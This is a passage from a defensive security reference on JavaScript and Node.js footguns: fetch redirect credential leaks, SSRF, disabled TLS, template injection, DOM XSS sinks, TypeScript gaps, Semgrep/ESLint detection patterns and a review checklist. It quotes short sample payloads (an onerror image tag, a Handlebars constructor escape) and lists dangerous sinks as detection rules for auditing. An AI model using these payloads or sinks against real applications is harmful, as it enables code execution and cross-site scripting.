completion. Use `process.exitCode = code` and let the event loop
drain.

---

## 10. HTTP, `fetch`, and redirect-following

Cross-link: `ssrf_url_parsing_expertise.md` for the cross-language
URL parser differential taxonomy.

### 10.1 `fetch(URL, { redirect: 'follow' })` is the default

Node 18+ implements the WHATWG Fetch standard, including the default
redirect behavior. `fetch(url)` with no options follows redirects up
to 20 hops, including redirects to different hosts and different
protocols (`http` → `https`, `https` → `http`).

The footgun: undici (Node's `fetch`) strips only `Authorization`,
`Cookie`, and `Proxy-Authorization` on cross-origin redirects, and only
since 5.26.2 (`Cookie`) and 5.28.3/6.6.1 (`Proxy-Authorization`); any
custom auth header is still forwarded. An attacker who can induce a redirect
from a server you trust to a server the attacker controls captures
the credentials in transit.

Kurt Boberg's CVE-2022-0235 (`node-fetch`, January 2022) is the
canonical disclosure in this class for the Node.js ecosystem.
`node-fetch` pre-3.1.1 and pre-2.6.7 forwarded `Authorization`,
`Cookie`, and `WWW-Authenticate` on cross-origin redirects. The fix
was to drop these headers when the redirect target's host is not
the same domain as, or a subdomain of, the original.

The WHATWG Fetch spec itself defines "redirect-mode" semantics that
distinguish CORS-credentialed from non-credentialed contexts; the
spec's behavior on Node (a non-browser context) is implemented in
`undici`, which Node's `fetch` is built on. Audit each fetch site
for whether the request includes credentials and whether the
redirect could leak them.

### 10.2 `redirect: 'manual'` and the manual chain

The defensive option is `fetch(url, { redirect: 'manual' })`, which
returns the 3xx response without following. The caller validates the
`Location` header (origin matches, protocol upgrade-only, host on
allowlist) and re-issues `fetch` against the allowlisted target.

### 10.3 Legacy `url.parse` versus WHATWG `new URL()`

Node's legacy `url.parse(str)` and the WHATWG `new URL(str)` have
differential behavior on edge inputs: tab and newline characters in
the host portion, percent-encoded characters, IPv6 brackets, and the
authority parsing for `userinfo@host:port`. The differential is the
SSRF parser-confusion class (`ssrf_url_parsing_expertise.md` §3).

Node documentation-deprecated `url.parse` (DEP0169) in v19.0.0 and
v18.13.0 and made it an application (runtime, non-`node_modules`)
deprecation in v24.0.0; the function still exists for compatibility.
New code should use `new URL()` exclusively.

### 10.4 SSRF via host-header injection and request smuggling

When user input reaches the `host` portion of a URL or the `Host`
header of an HTTP request, the request may be routed to a different
backend than the URL's hostname suggests. Cross-link
`http_web_security.md` (if exists, otherwise the cross-language
reference). The Node-specific footgun: the `http` module's
`request({hostname, host, port})` shape has two different host
fields with subtly different semantics, and code that takes
`hostname` from user input but `host` from a constant may produce a
request that is routed differently than its URL display suggests.

### 10.5 TLS `rejectUnauthorized: false`

The `https.Agent` and `tls.connect` options include
`rejectUnauthorized: true` by default — but a code search for
`rejectUnauthorized: false` reveals one of the most common Node
security antipatterns. Disabling certificate validation makes the
connection MITM-able by any attacker on the network path.

Audit-relevant patterns:

- Test code that disables validation against a self-signed test
  server, then ships to production with the flag still set.
- Library code that supports "insecure mode" via an env var that
  was meant for development.
- Proxy code that disables validation toward an internal CA-signed
  service, when the proper fix is to add the internal CA to the
  trust store via `NODE_EXTRA_CA_CERTS`.

The defensive posture is to *never*
disable validation; use `NODE_EXTRA_CA_CERTS` for trusted internal
CAs.

---

## 11. Template engines and SSTI in JavaScript

Cross-link: `template_code_injection_expertise.md` for the cross-
language SSTI treatment.

### 11.1 Tagged template literals and `eval`-class composition

Template literal syntax (`` `Hello ${name}!` ``) is safe by default —
embedded expressions are evaluated at the call site, not the
consumer. The footgun emerges when the template *string* is composed
from user input and passed to an eval-class sink: `eval(`return
${USER}`)`. Cross-link §3.

### 11.2 Handlebars / Pug / EJS / Nunjucks SSTI

Each template engine has a distinct surface when the *template
source* (not the data) is user-controlled:

- **Handlebars** — `Handlebars.compile(USER)` allows
  `{{this.constructor.constructor('return process')()}}`-style
  escapes; 4.x added `proto-access` defenses, older forks may not.
- **Pug** — compiles to JS with embedded expressions;
  `pug.render(USER)` is functionally `eval`.
- **EJS** — `<%= %>` escapes, `<%- %>` does not, `<% %>` is raw JS;
  `ejs.render(USER)` is RCE.
- **Nunjucks** — sandboxed mode; active sandbox-bypass research.

Cross-language treatment in `template_code_injection_expertise.md`.

### 11.3 Express `render` with user-controlled view name

`res.render(viewName, locals)` resolves `viewName` against the view
directory. If `viewName` is user-controlled, the attacker can render
arbitrary templates (error templates, admin-only templates), traverse
out of the directory (most engines fail closed on non-templates), and
in older EJS file-inclusion modes, trigger arbitrary file reads via
include directives. Defense: allowlist `viewName` against known
templates.

---

## 12. DOM and browser footguns

When JavaScript runs in a browser context (or in browser-like
contexts: Electron, Tauri webview, Cordova), the DOM API adds a
distinct surface.

### 12.1 `innerHTML = USER` — XSS direct

`element.innerHTML = USER` parses `USER` as HTML and inserts nodes.
HTML5 specifies that `<script>` injected via `innerHTML` is inert,
but every event-handler attribute (`onerror`, `onload`, `onmouseover`)
fires — `<img src=x onerror=...>` is the canonical payload.
Defense: `element.textContent = USER` for plain text; DOMPurify for
rich HTML.

### 12.2 `outerHTML = USER`, `document.write`, `insertAdjacentHTML`

`outerHTML` has the same attack surface as `innerHTML` plus
sibling-node injection. `document.write(USER)` and `document.writeln`
inject into the parser stream and scripts *do* execute (unlike
`innerHTML`); modern style guides forbid it.
`insertAdjacentHTML(position, USER)` is equivalent to `innerHTML` per
the HTML spec.

### 12.3 React `dangerouslySetInnerHTML`

```jsx
<div dangerouslySetInnerHTML={{__html: userContent}} />
```

Same attack surface as raw `innerHTML`. React adds no sanitization;
defense is upstream (DOMPurify, sanitize-html, Markdown rendering).

### 12.4 Angular `[innerHTML]` (sanitizes by default)

Angular's `[innerHTML]` binding sanitizes through `DomSanitizer` —
event handlers, `<script>`, and `javascript:` URLs are stripped. The
unsafe escape hatch is `bypassSecurityTrustHtml` (and the related
`bypassSecurityTrustUrl`, `bypassSecurityTrustResourceUrl`,
`bypassSecurityTrustStyle`, `bypassSecurityTrustScript`). Audit grep:
`bypassSecurityTrust*` — each call is a candidate XSS sink.

### 12.5 Vue `v-html`

`v-html` is equivalent to React's `dangerouslySetInnerHTML`: no
sanitization, raw insertion. Vue's docs explicitly name XSS as the
failure mode. Defense: never `v-html` on user content; use `{{ value }}`
text interpolation.

### 12.6 `javascript:` URL scheme

`<a href="javascript:USER">` evaluates `USER` as JS in the page
origin on click. Same surface for `<iframe src=>`, `<object data=>`,
`<form action=>`. React 16.9+ warns on `javascript:` URLs and React 19
errors on them in `src`/`href`; Vue does not block them. Defense: allowlist URL schemes
(`http:`, `https:`, `mailto:`, `tel:`) at the validation layer.

### 12.7 mXSS via mutation on reparse

mXSS is the class where a sanitizer cleans HTML, the clean HTML is
re-serialized into the DOM, and the browser's re-parse produces a
different DOM tree than the sanitizer saw — containing the attacker
payload. Cross-link `xml_parser_differential_expertise.md` §5.
DOMPurify and sanitize-html both attempt to defend, but historical
CVEs (DOMPurify 2.x in `<noscript>`/`<style>`/`<svg>` parse modes)
show the defense is not complete by construction. Defense: keep the
sanitizer current, strict tag/attr allowlists, render untrusted
content into a strict-CSP iframe.

---

## 13. TypeScript safety gaps

TypeScript narrows the JS surface but does not close it.

### 13.1 `any` and the type-system escape

`any` is the universal type — anything in, anything out, no
checking. The chain `any → any → sink` is invisible to the checker.
Defensive options: `noImplicitAny` (forbids inferred-`any`);
`unknown` (the safe `any` — values cannot be used without a type
narrowing); explicit `as any` as the auditable escape hatch.

### 13.2 `// @ts-ignore` and `// @ts-expect-error`

Both suppress the next line's type errors; `@ts-expect-error`
additionally asserts that an error existed (self-cleans if the error
is fixed). Each occurrence is an audit point. Defense: require an
explanatory comment per suppression; fail CI on uncommented ones.

### 13.3 Type assertions vs type guards

`const x = JSON.parse(input) as { id: number }` asserts a type the
compiler does not verify. Type guards (`typeof`, `instanceof`,
user-defined `value is T`) provide verified narrowing. Defense: parse
external input through a runtime validator (`zod`, `io-ts`, `ajv`).

### 13.4 `JSON.parse` returns `any`

Signature `JSON.parse(text: string): any`. Every downstream use
inherits `any` propagation. Same defense as §13.3: runtime validator.

### 13.5 The `strict` flag suite

`tsconfig.json` `"strict": true` enables nine options including
`noImplicitAny`, `strictNullChecks`, and the audit-relevant
`useUnknownInCatchVariables` — which types `catch (e)` as `unknown`
instead of `any`, forcing handlers to narrow before accessing
`e.message`/`e.stack`/`e.code`. Anything can be `throw`n in JS, so
the pre-narrowing default of `any` was a real footgun.

### 13.6 The runtime/static gap

Every external-data boundary (HTTP body, query string, env, file,
IPC, child-process output) is `unknown` at runtime regardless of
how it's typed at compile time. Verified narrowing at the boundary
is the audit point.

---

## 14. Detection patterns (Semgrep, ESLint)

Cross-link: `semgrep_rule_authoring.md` for the canonical rule-
authoring methodology.

### 14.1 Semgrep patterns for the high-severity sinks

Patterns to ship rules for, anchored on this doc's sections:

1. **`eval($USER)`** where `$USER` is taint-tagged from request body
   / query string. Direct RCE in Node, XSS in browser.
2. **`new Function(..., $USER)`** — second eval class.
3. **`setTimeout($USER, $MS)`** where `$USER` is a string literal-
   pattern (`metavariable-pattern: $USER pattern: "..."`). Third
   eval class.
4. **`setInterval($USER, $MS)`** — fourth eval class.
5. **`child_process.exec($USER, ...)`** — shell injection.
6. **`child_process.spawn($USER, $ARGS, $OPTS)`** with `$OPTS`
   containing `shell: true`. Same surface as `exec`.
7. **`require($USER)`** — module path injection.
8. **`import($USER)`** — dynamic ESM import.
9. **`fs.readFile($PATH, ...)`**, `fs.createReadStream($PATH)`,
   `fs.open($PATH, ...)` where `$PATH` is tainted. Path traversal.
10. **`fetch($URL, $OPTS)`** with `$OPTS.redirect` not equal to
    `'manual'` AND request headers include `Authorization`.
    Combined finding: cross-origin auth-header leak.
11. **`new https.Agent({rejectUnauthorized: false})`** — disabled
    TLS validation.
12. **`element.innerHTML = $USER`** — DOM XSS.
13. **`element.outerHTML = $USER`** — DOM XSS.
14. **`document.write($USER)` / `document.writeln($USER)`** — DOM
    XSS with script execution.
15. **JSX `dangerouslySetInnerHTML={{__html: $USER}}`** — React XSS.
16. **Vue template `v-html="$USER"`** — Vue XSS.
17. **`vm.runInContext($CODE, $CTX)` / `vm.runInNewContext($CODE)` /
    `new vm.Script($CODE)`** — sandbox surface; every call is an
    audit candidate.
18. **`Object.assign($TARGET, JSON.parse($USER))`** — potential
    prototype pollution if `$TARGET` is not `Object.create(null)`.
    Tighter rule: any merge/clone library function flowing
    `JSON.parse(req.body)` into the source argument.
19. **`process.env` serialization sinks.** `JSON.stringify(process.env)`,
    `console.log(process.env)`, error reporter calls with
    `process.env` in scope.

### 14.2 ESLint rule integration

The `eslint-plugin-security` package ships rules for many of the
sinks above:

- `detect-eval-with-expression` — `eval` with a dynamic argument.
- `detect-non-literal-require` — `require(USER)`.
- `detect-non-literal-fs-filename` — `fs.*(USER_PATH)`.
- `detect-child-process` — any `child_process` usage (informational).
- `detect-unsafe-regex` — ReDoS patterns.
- `detect-buffer-noassert` — `Buffer.write*(... , noAssert: true)`.
- `detect-no-csrf-before-method-override` — Express middleware order.
- `detect-object-injection` — bracket-notation property access with
  user input (broad rule, high false-positive rate).

The `eslint-plugin-no-unsanitized` package adds DOM-sink rules
(`innerHTML`, `outerHTML`, `document.write`, `insertAdjacentHTML`).

The defensive integration: enable the plugins, suppress false
positives with comments that explain why, fail CI on unsuppressed
violations.

### 14.3 ESLint `eqeqeq`, `no-eval`, `no-implied-eval`,
`no-new-func`

The core ESLint rules cover the eval family directly:

- `eqeqeq` — `==`/`!=` forbidden; require `===`/`!==`.
- `no-eval` — direct or indirect `eval` calls.
- `no-implied-eval` — `setTimeout` / `setInterval` with a string
  argument.
- `no-new-func` — `new Function(...)` constructor.

Enable all four in every project's eslint config.

---

## 15. Defensive checklist

The 15-item checklist for JS/Node code review:

1. **`===` everywhere.** `==` only against `null`/`undefined`, with
   an explanatory comment.
2. **Strict mode universally.** Every file `"use strict"` or every
   file an ES module (which is automatically strict).
3. **No `eval`, `new Function`, stringy `setTimeout`/`setInterval`,
   `with`.** ESLint rules enforced; suppressions audited.
4. **Prototype-pollution defenses.** `Object.create(null)` for maps
   over user-controlled keys; `Object.freeze(Object.prototype)`
   considered for high-assurance services; allowlist `__proto__` /
   `constructor` / `prototype` keys at the input layer.
5. **No `vm` for untrusted code.** Process boundary or
   `quickjs-emscripten` WASM boundary; never vm/vm2 for adversarial
   inputs.
6. **Unhandled-rejection audit.** Every async path has a `.catch`
   or is `await`ed inside `try`; the global `unhandledRejection`
   handler exists as a safety net only.
7. **`forEach` + `async` audit.** Search for the pattern; replace
   with `for...of` (sequential) or `Promise.all(arr.map(...))`
   (parallel).
8. **No `require(USER)` or `import(USER)`.** Module paths are
   constants or allowlisted.
9. **`child_process.exec` forbidden.** Use `execFile` / `spawn`
   with argv arrays; explicitly set `shell: false` (the default,
   but make it explicit for audit).
10. **`fs` path-traversal defenses.** `path.resolve` + jail check
    before every filesystem operation on user-controlled paths;
    `realpath` post-open for symlink defenses.
11. **`fetch` redirect audit.** `redirect: 'manual'` for any
    request with credentials; allowlist redirect targets.
12. **No `rejectUnauthorized: false`.** Use `NODE_EXTRA_CA_CERTS`
    for internal CAs; treat any disabled-TLS finding as HIGH.
13. **DOM-sink audit.** No `innerHTML`/`outerHTML`/`document.write`
    with user input; sanitize through DOMPurify or render through
    text-only paths.
14. **TypeScript `strict: true`** and `useUnknownInCatchVariables`;
    every external-data boundary parsed through `zod`/`io-ts`/`ajv`.
15. **npm install discipline.** `--ignore-scripts` for production
    installs; lockfile committed; cooldown via
    `min-release-age=7` (npm) / `minimumReleaseAge: 10080` (pnpm) /
    `npmMinimalAgeGate: "1w"` (Yarn); SBOM audited on every upgrade.

Cross-link: `code_review_expertise.md` for the click-count severity
heuristic that prioritizes the findings; `cicd_supply_chain_expertise.md`
for the dependency-supply-chain dimension.

---

## 16. Variant analysis: under-explored runtimes and surfaces

### 16.1 Bun runtime

Bun (Jarred Sumner, since 2022) is a JavaScriptCore-based runtime
targeting Node.js compatibility. Bun-specific footguns:

- **No permission model.** Bun ships without an analogue to Node's
  experimental `--permission` or Deno's `--allow-*` flag set; every
  Bun program has full filesystem, network, and child-process
  capability by default.
- **JavaScriptCore differences.** Engine-level differences from V8
  surface in regex edge inputs, some TC39 proposals, and undocumented
  V8 behavior (optimization fences, `--allow-natives-syntax`).
- **`Bun.*` namespace.** `Bun.serve`, `Bun.spawn`, `Bun.file` have
  their own defaults that may differ from the Node analogues. Worth
  a per-API audit.
- **`bun install`** does not run dependency lifecycle scripts (e.g.
  `postinstall`) by default, unlike npm, except for packages on its
  default trusted list or in `trustedDependencies`; `--ignore-scripts`
  disables them for all packages.

### 16.2 Deno's permission model

Deno (Ryan Dahl, since 2018) adopts permission-by-default-denied. A
Deno script with no flags cannot read files, write files, spawn
processes, access the network, or read env. Permissions are granted
via flags (`--allow-read=/path`, `--allow-net=host`, etc.). Footguns:

- **Granular but composable.** `--allow-net=host1` plus `--allow-write`
  to a directory can let a separate watcher process exfiltrate via
  the filesystem side channel.
- **`--allow-all`** in tutorials, CI scripts, and "just get it
  working" code defeats the model entirely.
- **URL imports are cached.** A `import 'https://example.com/x.ts'`
  fetches once and caches; subsequent malicious updates to the
  remote do not re-fetch, but the original cache content is
  permanent and unaudited.

Deno's model is the most explicit JS-runtime sandbox at the app
level, but it is not a substitute for OS-level process boundaries
against compromised in-process scripts.

### 16.3 Edge runtime fragmentation (WinterCG)

WinterTC (Ecma TC55, formerly the W3C WinterCG community group) is the
alignment effort across Node, Deno, Bun,
Cloudflare Workers, and Vercel Edge. As of 2026:

- **Cloudflare Workers** runs V8 isolates; `fetch`, `crypto.subtle`,
  `Request`/`Response` are WinterCG; `child_process`, `fs`, and most
  Node-specific APIs are absent. `Buffer` polyfills may have subtly
  different semantics.
- **Vercel Edge** runs on Cloudflare isolate tech with Vercel shims.
- **AWS Lambda@Edge** runs full Node.js with execution-time limits.
- **Fastly Compute@Edge** runs JS-to-WASM; the trust boundary is
  the WASM sandbox.

Audit posture: identify the runtime per code path; code shared
across runtimes inherits the union of footguns.

### 16.4 Web Workers and structured-clone footguns

Web Workers and Node's `worker_threads` pass messages via
structured-clone, which cannot serialize functions, loses prototype
identity (cloned objects get `Object.prototype`, not their class's),
cannot serialize getters/setters, and throws on `Symbol`. Class
instances passed through a worker become plain objects; method calls
on the receiver throw `TypeError`. `SharedArrayBuffer` is shared by
reference and bypasses structured-clone — introducing shared-mutable-
state surface that JS was historically immune to (cross-link
`race_conditions_concurrency_expertise.md`).

### 16.5 Browser-Node-shared code dual-trust-zone hazard

Isomorphic code (Next.js, Remix server-rendering) crosses two trust
zones. A function written for browser context may silently no-op or
throw in Node, or vice versa. A server-render pass that imports a
browser-only library may leak server state into the client bundle.
Audit pattern: identify the boundary (`getServerSideProps`, framework
`loader`) and verify no client-only imports leak across.

---

## 17. References

### 17.1 Language and engine documentation

- ECMA-262, ECMAScript Language Specification. [tc39.es/ecma262/](https://tc39.es/ecma262/).
  Normative source for `==`, eval, prototype chain.
- V8 blog: [v8.dev/blog](https://v8.dev/blog). Mathias Bynens's
  internals posts, including ["JavaScript engine fundamentals:
  optimizing prototypes"](https://mathiasbynens.be/notes/prototypes).
- Node.js docs: [nodejs.org/api](https://nodejs.org/api). Authoritative
  on `vm`, `fs`, `child_process`, `process`, `worker_threads`.
- Node.js permission model: [nodejs.org/api/permissions.html](https://nodejs.org/api/permissions.html).
- Deno permissions: [docs.deno.com/runtime/fundamentals/security/](https://docs.deno.com/runtime/fundamentals/security/).

### 17.2 Vulnerability disclosures

- CVE-2022-0235 (node-fetch): [github.com/advisories/GHSA-r683-j2x4-v87g](https://github.com/advisories/GHSA-r683-j2x4-v87g).
  Cross-origin header forwarding on redirect.
- vm2 (Simek 2023 deprecation and 2026 CVE series):
  [github.com/patriksimek/vm2](https://github.com/patriksimek/vm2).
- Axios npm compromise (March 2026), Microsoft Threat Intelligence
  advisory: [microsoft.com/en-us/security/blog/2026/04/01/mitigating-the-axios-npm-supply-chain-compromise/](https://www.microsoft.com/en-us/security/blog/2026/04/01/mitigating-the-axios-npm-supply-chain-compromise/).
- "Silent Spring: Prototype Pollution Leads to RCE in Node.js"
  (Shcherbakov, Balliu, Staicu — USENIX Security 2023):
  [usenix.org/conference/usenixsecurity23/presentation/shcherbakov](https://www.usenix.org/conference/usenixsecurity23/presentation/shcherbakov);
  artifact at [github.com/KTH-LangSec/silent-spring](https://github.com/KTH-LangSec/silent-spring).
- "Prototype Pollution Attack in NodeJS" (Arteau, NorthSec 2018):
  [github.com/HoLyVieR/prototype-pollution-nsec18](https://github.com/HoLyVieR/prototype-pollution-nsec18).

### 17.3 Books, community, tooling

- Liran Tal, *Essential Node.js Security* and the *Node.js Secure
  Coding* series at [nodejs-security.com/books](https://www.nodejs-security.com/books).
- Douglas Crockford, *JavaScript: The Good Parts* (O'Reilly, 2008).
  The historical anchor for `===`-everywhere discipline.
- Marijn Haverbeke, *Eloquent JavaScript*: [eloquentjavascript.net](https://eloquentjavascript.net/).
- OWASP NodeGoat: [github.com/OWASP/NodeGoat](https://github.com/OWASP/NodeGoat).
- OWASP Node.js Security Cheat Sheet: [cheatsheetseries.owasp.org/cheatsheets/Nodejs_Security_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Nodejs_Security_Cheat_Sheet.html).
- PortSwigger Prototype Pollution: [portswigger.net/web-security/prototype-pollution](https://portswigger.net/web-security/prototype-pollution)
  and server-side-detection at [portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution).
- Node.js Ecosystem Security WG: [github.com/nodejs/security-wg](https://github.com/nodejs/security-wg).
- Snyk Vulnerability DB: [security.snyk.io](https://security.snyk.io/).
- GitHub Advisory Database: [github.com/advisories](https://github.com/advisories).
- ESLint plugins: `eslint-plugin-security`, `eslint-plugin-no-unsanitized`;
  core rule `no-prototype-builtins`.
- Semgrep: [semgrep.dev](https://semgrep.dev/) — see
  `semgrep_rule_authoring.md`.
- CodeQL: [codeql.github.com](https://codeql.github.com/) —
  basis of the `silent-spring` toolkit.
- Runtime validators: [`zod`](https://zod.dev/),
  [`ajv`](https://ajv.js.org/).
- DOMPurify (Cure53): [github.com/cure53/DOMPurify](https://github.com/cure53/DOMPurify).

### 17.4 Companion docs in this corpus

Behavioral-footgun siblings: `csharp_dotnet_footguns_expertise.md`,
`java_footguns_expertise.md`.

Cross-language bug-class anchors: `prototype_pollution_expertise.md`
(§4), `js_sandbox_escape_expertise.md` (§6),
`shell_injection_expertise.md` (§9), `ssrf_url_parsing_expertise.md`
(§10), `template_code_injection_expertise.md` (§11),
`cicd_supply_chain_expertise.md` (§8.4),
`xml_parser_differential_expertise.md` (§12.8),
`race_conditions_concurrency_expertise.md` (§7),
`code_review_expertise.md` (severity + posture),
`semgrep_rule_authoring.md` (detection authoring).

---

## Closing note

This doc is the third in the language-specific-behavioral-footguns
class, after `csharp_dotnet_footguns_expertise.md` and
`java_footguns_expertise.md`. Python, Go, Rust, and Ruby remain
planned. The JS/Node edition is denser than the C# edition because
JavaScript's lack of compile-time type discipline broadens the
footgun surface — almost every primitive has a coercion path or a
default-permissive flag — and Node adds filesystem, process, and
network surfaces that the browser does not expose to the same code.
